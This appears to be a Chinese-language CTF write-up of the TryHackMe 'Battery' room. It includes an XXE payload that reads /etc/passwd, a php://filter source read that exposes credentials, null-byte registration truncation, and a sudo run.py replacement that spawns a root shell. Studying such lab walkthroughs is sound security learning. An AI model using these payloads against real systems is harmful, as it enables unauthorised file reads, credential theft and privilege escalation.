# Battery
> URL :　https://tryhackme.com/room/battery

IP : 10.10.207.162

## Recon
- 掃 Port
	- `rustscan -a 10.10.207.162 -r 1-65535`
		- ![](https://i.imgur.com/YI7brFj.png)
		- 發現有開
			- 22
			- 80
	- `nmap -A -p22,80 10.10.207.162`
		- ![](https://i.imgur.com/fpTOJSl.png)
## Web
- 觀察首頁
	- ![](https://i.imgur.com/kzK5QSI.png)
- 掃路徑
	- ![](https://i.imgur.com/zW9T06O.png)
	- `/forms`
		- ![](https://i.imgur.com/0BtjlCh.png)
	- `/admin.php`
		- ![](https://i.imgur.com/Yt1XqNk.png)
- 發現 `/forms` 把 Header 拔掉就不會自動跳轉
	- ![](https://i.imgur.com/dBIg21Q.png)
	- 裡面傳送的資料是 XML ，可能可以 XXE
		- ![](https://i.imgur.com/MnxLcgL.png)
	```javascript=
	function XMLFunction(){
		var xml = '' +
			'<?xml version="1.0" encoding="UTF-8"?>' +
			'<root>' +
			'<name>' + $('#name').val() + '</name>' +
			'<search>' + $('#search').val() + '</search>' +
			'</root>';
		var xmlhttp = new XMLHttpRequest();
		xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
				console.log(xmlhttp.readyState);
				console.log(xmlhttp.responseText);
				document.getElementById('errorMessage').innerHTML = xmlhttp.responseText;
			}
		}
		xmlhttp.open("POST","forms.php",true);
		xmlhttp.send(xml);
	};
	```
	- 但沒有登入都失敗
- 在 `register.php` 註冊一組帳密
	- `meow`
	- `ABC`
	- `meow`
	- ![](https://i.imgur.com/z1niZ8X.png)
	- 註冊成功
		- ![](https://i.imgur.com/hqNbHMh.png)
- 嘗試登入
	- ![](https://i.imgur.com/Lo6rA6Z.png)
	- 使用介面上的功能
		- ![](https://i.imgur.com/o5zsYOs.png)
		- 發現不能使用
- 再註冊一組
	- `meow1`
	- `DEF`
	- `meow1`
- 掃目錄
	- ![](https://i.imgur.com/4zXmQmN.png)
	- 發現一個 `/report`
- 載下來發現是一個 ELF
	- ![](https://i.imgur.com/tQ07xT1.png)
## Reverse
- 選單
	- ![](https://i.imgur.com/0fPOAwu.png)
- 使用者
	- ![](https://i.imgur.com/45VYQ51.png)
- 字串比較
	- ![](https://i.imgur.com/e5GzGAk.png)
- 更新
	- ![](https://i.imgur.com/LWMnjwK.png)
	- 這邊看到 `admin@bank.a` 滿可疑的
## Web
- 嘗試註冊 `admin@bank.a`
	- ![](https://i.imgur.com/ETydBcl.png)
	- ![](https://i.imgur.com/z3FWmBy.png)
		- 被嘲諷ㄌQQ
		- 但這代表應該確實跟這個有關!!
- 用 Burp 後面加上 `%00` 截斷
	- ![](https://i.imgur.com/Rz7ZLOk.png)
- 註冊成功
	- ![](https://i.imgur.com/xpZQPEi.png)
- 後台亂輸入都會噴錯
	- ![](https://i.imgur.com/1PJTJn7.png)
- 重新試著 XXE
	- ![](https://i.imgur.com/jmnfWHX.png)
```javascript=
function XMLFunction(){
    var xml = '' +
        '<?xml version="1.0" encoding="UTF-8"?>\n' +
		'<!DOCTYPE a [ <!ENTITY b SYSTEM "file:///etc/passwd"> ]>\n' +
        '<root>' +
        '<name>' + "0" + '</name>' +
        '<search>' + "&b;" + '</search>' +
        '</root>';
    var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
        if(xmlhttp.readyState == 4){
            console.log(xmlhttp.readyState);
            console.log(xmlhttp.responseText);
        }
    }
    xmlhttp.open("POST","forms.php",true);
    xmlhttp.send(xml);
};
XMLFunction();
```
- 可以讀檔
	- ![](https://i.imgur.com/Wfam6PO.png)
```
cyber:x:1000:1000:cyber,,,:/home/cyber:/bin/bash
mysql:x:107:113:MySQL Server,,,:/nonexistent:/bin/false
yash:x:1002:1002:,,,:/home/yash:/bin/bash
```
- 看起來有興趣的使用者
	- `cyber`
	- `yash`
- 讀取原始碼
	- `php://filter/convert.base64-encode/resource=/var/www/html/acc.php`
	- ![](https://i.imgur.com/EXkrQXL.png)
	- 找到註解上的密碼
		- `//MY CREDS :- cyber:super#secure&password!`
## SSH
- ![](https://i.imgur.com/WhKKIPs.png)
	- 順利連上
- 取得 Base Flag
	- ![](https://i.imgur.com/3aOe5eP.png)
## 提權
- 起手式 `sudo -l`
	- ![](https://i.imgur.com/OF32tzf.png)
	- 發現可以用 root 執行一個 `run.py`
- `run.py`
	- ![](https://i.imgur.com/fJIS0Oe.png)
	- 但我們沒有權限讀取他 QQ
- 觀察原始碼
	- `admin.php`
		- 找到 mysql 的帳密
- Dump Mysql
	- mysqldump -u root -h 127.0.0.1 -p details > a.sql
	- ![](https://i.imgur.com/6SQ3wdb.png)
	- ![](https://i.imgur.com/EotjMMo.png)
	- 看到一組密碼
		- ![](https://i.imgur.com/amFWjRV.png)
		- `I_know_my_password`
	- 但好像就沒有什麼進展了 QQ
- 跑 Linpeas
	- ![](https://i.imgur.com/W4vdGzF.png)
	- 發現 Linux Kernel 好像有點舊，可以用 Exploit
	- https://www.exploit-db.com/exploits/37292
- 試著載下來編譯執行
	- ![](https://i.imgur.com/H9YKMfY.png)
	- 就成功 Root ㄌ
- Flag2
	- ![](https://i.imgur.com/y95l3c8.png)
- Root Flag
	- ![](https://i.imgur.com/fAVwuni.png)
	- ![](https://i.imgur.com/GBtAZjF.png)

## 另外一種提權法
- 剛剛可以用 sudo 執行 `run.py`
	- 但是沒有權限可以讀取
- 但因為這是我的家目錄，所以我可以改檔名、新增檔案
	- ![](https://i.imgur.com/Q9fWApP.png)
- 所以自己創一個 `run.py`
	- `import os`
	- `os.system("/bin/bash")`
- 再 sudo 它
	- ![](https://i.imgur.com/6O92JvY.png)
	- 也可以順利提權




## 學到ㄌ
%00 截斷
XXE 記得加 ;